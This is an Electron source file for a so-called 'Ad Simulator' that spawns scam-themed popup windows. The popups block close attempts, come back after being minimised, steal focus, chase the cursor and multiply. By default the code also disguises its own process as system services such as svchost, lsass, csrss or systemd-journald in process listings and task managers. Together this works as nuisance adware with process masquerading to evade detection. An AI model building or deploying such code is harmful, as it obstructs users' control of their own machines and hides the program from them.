const { app, BrowserWindow, screen, ipcMain } = require("electron");
const path = require("path");

// Parse CLI args
function parseArgs() {
  const args = {};
  process.argv.slice(2).forEach((arg) => {
    const match = arg.match(/^--(\w[\w-]*)=(.*)$/);
    if (match) {
      const key = match[1].replace(/-([a-z])/g, (_, c) => c.toUpperCase());
      let val = match[2];
      if (val === "true") val = true;
      else if (val === "false") val = false;
      else if (!isNaN(val) && val !== "") val = Number(val);
      args[key] = val;
    }
  });
  return args;
}

const config = {
  popupCount: 3,
  style: "mixed",
  speed: 5,
  fakeClose: 2,
  respawn: false,
  spawnInterval: 800,
  duration: 0,
  theme: "mixed",
  size: "random",
  sound: false,
  disguise: "random",
  ...parseArgs(),
};

console.log("Ad Simulator Config:", config);

const THEMES = ["casino", "dating", "virus", "winner"];
const STYLES = ["bounce", "drift", "chase"];
const SIZES = {
  small: { w: 300, h: 200 },
  medium: { w: 450, h: 320 },
  large: { w: 600, h: 450 },
};

const popups = [];
let primaryDisplay;

function getRandomTheme() {
  if (config.theme !== "mixed") return config.theme;
  return THEMES[Math.floor(Math.random() * THEMES.length)];
}

function getRandomStyle() {
  if (config.style !== "mixed") return config.style;
  return STYLES[Math.floor(Math.random() * STYLES.length)];
}

function getSize() {
  if (config.size !== "random") return SIZES[config.size];
  const keys = Object.keys(SIZES);
  return SIZES[keys[Math.floor(Math.random() * keys.length)]];
}

function getRandomPosition(w, h) {
  const { width, height } = primaryDisplay.workAreaSize;
  return {
    x: Math.floor(Math.random() * (width - w)),
    y: Math.floor(Math.random() * (height - h)),
  };
}

function createPopup(index) {
  const size = getSize();
  const pos = getRandomPosition(size.w, size.h);
  const theme = getRandomTheme();
  const style = getRandomStyle();

  const win = new BrowserWindow({
    width: size.w,
    height: size.h,
    x: pos.x,
    y: pos.y,
    frame: false,
    alwaysOnTop: true,
    skipTaskbar: true,
    resizable: false,
    transparent: true,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, "preload.js"),
    },
  });

  const query = new URLSearchParams({
    theme,
    style,
    speed: String(config.speed),
    fakeClose: String(config.fakeClose),
    index: String(index),
    sound: String(config.sound),
  });

  win.loadFile("popup.html", { query });
  win.setAlwaysOnTop(true, "floating");

  // Block Alt+F4 / window close attempts
  win.on("close", (e) => {
    if (!app.isQuitting) {
      e.preventDefault();
      // Dodge instead of closing
      const { width: sw, height: sh } = primaryDisplay.workAreaSize;
      const [w, h] = win.getSize();
      win.setPosition(
        Math.floor(Math.random() * (sw - w)),
        Math.floor(Math.random() * (sh - h))
      );
    }
  });

  // Restore from minimize
  win.on("minimize", () => {
    if (!app.isQuitting) {
      setTimeout(() => {
        if (!win.isDestroyed()) {
          win.restore();
          win.setAlwaysOnTop(true, "floating");
        }
      }, 300 + Math.random() * 700);
    }
  });

  // Periodically re-assert always on top and steal focus
  const focusInterval = setInterval(() => {
    if (win.isDestroyed()) {
      clearInterval(focusInterval);
      return;
    }
    win.setAlwaysOnTop(true, "floating");
    if (Math.random() < 0.3) {
      win.focus();
    }
  }, 3000 + Math.random() * 2000);

  // Give each window a different disguised title in taskbar
  if (config.disguise) {
    const winTitle = config.disguise === "random"
      ? getRandomDisguiseTitle()
      : (DISGUISE_PRESETS[config.disguise] || { title: config.disguise }).title;
    win.setTitle(winTitle);
  }

  // Movement logic
  // Ensure initial velocity is never too small - at least 60% of max speed
  const minSpeed = config.speed * 0.6;
  function randVelocity() {
    let v = (Math.random() - 0.5) * config.speed * 2;
    if (Math.abs(v) < minSpeed) v = (v >= 0 ? 1 : -1) * (minSpeed + Math.random() * minSpeed);
    return v;
  }
  const movementState = {
    vx: randVelocity(),
    vy: randVelocity(),
    anchorX: pos.x,
    anchorY: pos.y,
    startTime: Date.now(),
    interval: null,
  };

  function startMovement() {
    const { width: screenW, height: screenH } = primaryDisplay.workAreaSize;

    movementState.interval = setInterval(() => {
      if (win.isDestroyed()) {
        clearInterval(movementState.interval);
        return;
      }

      const [cx, cy] = win.getPosition();
      const [w, h] = win.getSize();

      if (style === "bounce") {
        let nx = cx + movementState.vx;
        let ny = cy + movementState.vy;
        if (nx <= 0 || nx + w >= screenW) {
          movementState.vx *= -1;
          nx = cx + movementState.vx;
        }
        if (ny <= 0 || ny + h >= screenH) {
          movementState.vy *= -1;
          ny = cy + movementState.vy;
        }
        nx = Math.max(0, Math.min(nx, screenW - w));
        ny = Math.max(0, Math.min(ny, screenH - h));
        win.setPosition(Math.round(nx), Math.round(ny));
      } else if (style === "drift") {
        // Orbit around anchor point instead of accumulating deltas
        const elapsed = (Date.now() - movementState.startTime) / 1000;
        const radius = 80 + config.speed * 20;
        const nx = movementState.anchorX + Math.sin(elapsed * 0.4 + index * 2) * radius;
        const ny = movementState.anchorY + Math.cos(elapsed * 0.3 + index * 2) * radius * 0.7;
        const clampedX = Math.max(0, Math.min(Math.round(nx), screenW - w));
        const clampedY = Math.max(0, Math.min(Math.round(ny), screenH - h));
        win.setPosition(clampedX, clampedY);
      } else if (style === "chase") {
        const cursor = screen.getCursorScreenPoint();
        const dx = cursor.x - (cx + w / 2);
        const dy = cursor.y - (cy + h / 2);
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist > 10) {
          const step = Math.min(config.speed, dist * 0.05);
          const nx = cx + (dx / dist) * step;
          const ny = cy + (dy / dist) * step;
          win.setPosition(Math.round(nx), Math.round(ny));
        }
      }
    }, 16);
  }

  startMovement();

  win.on("closed", () => {
    clearInterval(movementState.interval);
    const idx = popups.indexOf(win);
    if (idx !== -1) popups.splice(idx, 1);

    if (config.respawn && !app.isQuitting) {
      setTimeout(() => {
        if (!app.isQuitting) {
          const newWin = createPopup(index);
          popups.push(newWin);
        }
      }, 500 + Math.random() * 1500);
    }
  });

  return win;
}

ipcMain.on("real-close", (event) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (win && !win.isDestroyed()) {
    win.removeAllListeners("close");
    win.close();
  }
});

ipcMain.on("dodge", (event) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (win && !win.isDestroyed()) {
    const { width: screenW, height: screenH } = primaryDisplay.workAreaSize;
    const [w, h] = win.getSize();
    const pos = getRandomPosition(w, h);
    win.setPosition(pos.x, pos.y);
  }
});

ipcMain.on("multiply", (event) => {
  if (popups.length < 20) {
    const newWin = createPopup(popups.length);
    popups.push(newWin);
  }
});

// ============================================================
// Process disguise: rename process to look like a system service
// ============================================================

const DISGUISE_PRESETS = {
  // Linux system services
  systemd: { title: "systemd-journald", argv0: "systemd-journald" },
  dbus: { title: "dbus-daemon", argv0: "dbus-daemon --system" },
  networkmanager: { title: "NetworkManager", argv0: "NetworkManager --no-daemon" },
  pulseaudio: { title: "pulseaudio", argv0: "pulseaudio --daemonize=no" },
  pipewire: { title: "pipewire", argv0: "pipewire" },
  gvfs: { title: "gvfsd", argv0: "/usr/libexec/gvfsd" },
  tracker: { title: "tracker-miner-fs-3", argv0: "tracker-miner-fs-3" },
  gnomeshell: { title: "gnome-shell", argv0: "/usr/bin/gnome-shell" },
  xdg: { title: "xdg-desktop-portal", argv0: "/usr/libexec/xdg-desktop-portal" },
  // Cross-platform innocent names
  updater: { title: "Software Update Helper", argv0: "update-helper" },
  helper: { title: "Desktop Window Manager", argv0: "dwm-service" },
  runtime: { title: ".NET Host Runtime", argv0: "dotnet-host" },
  java: { title: "Java(TM) Platform SE", argv0: "java -Xms256m -server" },
  chrome: { title: "Google Chrome Helper", argv0: "chrome --type=utility" },
  vscode: { title: "Code Helper (Plugin)", argv0: "code --ms-enable-electron-run-as-node" },
  teams: { title: "Microsoft Teams Helper", argv0: "teams --type=renderer" },
  slack: { title: "Slack Helper (GPU)", argv0: "slack --type=gpu-process" },
  // macOS
  windowserver: { title: "WindowServer", argv0: "WindowServer" },
  coreaudio: { title: "coreaudiod", argv0: "/usr/sbin/coreaudiod" },
  spotlight: { title: "mds_stores", argv0: "mds_stores" },
  // Windows-style
  svchost: { title: "Service Host: Local System", argv0: "svchost.exe -k LocalSystem" },
  csrss: { title: "Client Server Runtime", argv0: "csrss.exe" },
  lsass: { title: "Local Security Authority", argv0: "lsass.exe" },
  explorer: { title: "Windows Explorer", argv0: "explorer.exe" },
};

function getRandomDisguiseTitle() {
  const platform = process.platform;
  let candidates;
  if (platform === "linux") {
    candidates = ["systemd", "dbus", "networkmanager", "pulseaudio", "pipewire",
      "gvfs", "tracker", "gnomeshell", "xdg", "updater", "chrome", "vscode"];
  } else if (platform === "darwin") {
    candidates = ["windowserver", "coreaudio", "spotlight", "chrome", "vscode",
      "slack", "teams", "helper", "updater"];
  } else {
    candidates = ["svchost", "csrss", "lsass", "explorer", "chrome", "vscode",
      "teams", "slack", "updater", "runtime"];
  }
  const key = candidates[Math.floor(Math.random() * candidates.length)];
  return DISGUISE_PRESETS[key].title;
}

function applyDisguise(disguiseName) {
  let preset;

  if (disguiseName === "random") {
    const keys = Object.keys(DISGUISE_PRESETS);
    // Pick platform-appropriate ones preferentially
    const platform = process.platform;
    let candidates;
    if (platform === "linux") {
      candidates = ["systemd", "dbus", "networkmanager", "pulseaudio", "pipewire",
        "gvfs", "tracker", "gnomeshell", "xdg", "updater", "chrome", "vscode"];
    } else if (platform === "darwin") {
      candidates = ["windowserver", "coreaudio", "spotlight", "chrome", "vscode",
        "slack", "teams", "helper", "updater"];
    } else {
      candidates = ["svchost", "csrss", "lsass", "explorer", "chrome", "vscode",
        "teams", "slack", "updater", "runtime"];
    }
    disguiseName = candidates[Math.floor(Math.random() * candidates.length)];
  }

  preset = DISGUISE_PRESETS[disguiseName];
  if (!preset) {
    // Treat as custom name
    preset = { title: disguiseName, argv0: disguiseName };
  }

  // 1. Set process.title (affects `ps` output on Linux/macOS)
  process.title = preset.argv0;

  // 2. Overwrite process.argv[0] (shows up in /proc/self/cmdline on Linux)
  process.argv[0] = preset.argv0;

  // 3. Set the Electron app name (affects task manager app name column)
  app.setName(preset.title);

  // 4. On Linux, try to overwrite /proc/self/comm (16-char limit)
  if (process.platform === "linux") {
    try {
      const fs = require("fs");
      // /proc/self/comm controls the short process name (shown in top, htop, etc.)
      const shortName = preset.argv0.split(/[\s/]/).pop().substring(0, 15);
      fs.writeFileSync("/proc/self/comm", shortName);
    } catch (_) {
      // May fail without permissions, that's ok
    }
  }

  console.log(`Process disguised as: "${preset.title}" (argv0: "${preset.argv0}")`);
  return preset;
}

// ============================================================

app.on("before-quit", () => {
  app.isQuitting = true;
  // Remove close interceptors so windows can actually close
  popups.forEach((win) => {
    if (!win.isDestroyed()) {
      win.removeAllListeners("close");
    }
  });
});

app.whenReady().then(() => {
  primaryDisplay = screen.getPrimaryDisplay();

  // Spawn popups with interval
  let spawned = 0;
  const spawnTimer = setInterval(() => {
    if (spawned >= config.popupCount) {
      clearInterval(spawnTimer);
      return;
    }
    const win = createPopup(spawned);
    popups.push(win);
    spawned++;
  }, config.spawnInterval);

  // Apply process disguise (always on by default)
  applyDisguise(config.disguise || "random");

  // Auto quit
  if (config.duration > 0) {
    setTimeout(() => {
      app.isQuitting = true;
      app.quit();
    }, config.duration * 1000);
  }
});

app.on("window-all-closed", () => {
  if (!config.respawn) {
    app.quit();
  }
});
